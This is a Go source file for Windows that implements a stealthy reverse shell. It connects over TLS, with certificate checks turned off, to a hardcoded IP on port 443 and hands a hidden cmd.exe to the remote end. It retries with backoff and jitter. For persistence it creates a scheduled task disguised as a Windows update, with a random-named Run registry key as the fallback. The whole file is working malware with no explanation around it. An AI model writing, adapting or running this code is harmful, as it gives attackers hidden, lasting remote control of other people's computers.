//go:build windows
package main

import (
	"crypto/tls"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"syscall"
	"time"
)

var (
	ip   = "192.168.184.152"
	port = "443"
)

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func installPersistence() bool {
	exe, err := os.Executable()
	if err != nil {
		return false
	}
	taskName := "WindowsUpdateTask" + randomString(4)
	cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", exe, "/sc", "onlogon", "/f")
	if cmd.Run() == nil {
		return true
	}

	regName := randomString(8)
	cmd = exec.Command("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", regName, "/t", "REG_SZ", "/d", exe, "/f")
	return cmd.Run() == nil
}

func main() {
	baseDelay := 5 * time.Second
	maxDelay := 10 * time.Minute
	currentDelay := baseDelay

	for {
		err := runRevShell()
		if err == nil {
			currentDelay = baseDelay
		} else {
			currentDelay *= 2
			if currentDelay > maxDelay {
				currentDelay = maxDelay
			}
		}

		jitter := time.Duration(rand.Int63n(int64(currentDelay)))
		time.Sleep(currentDelay + jitter)
	}
}

var persistenceInstalled = false

func runRevShell() error {
	conf := &tls.Config{InsecureSkipVerify: true}
	conn, err := tls.Dial("tcp", net.JoinHostPort(ip, port), conf)
	if err != nil {
		return err
	}
	defer conn.Close()

	if !persistenceInstalled {
		if installPersistence() {
			persistenceInstalled = true
		}
	}

	cmd := exec.Command("cmd.exe")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:true,
		CreationFlags: 0x08000000,
	}
	return cmd.Run()
}
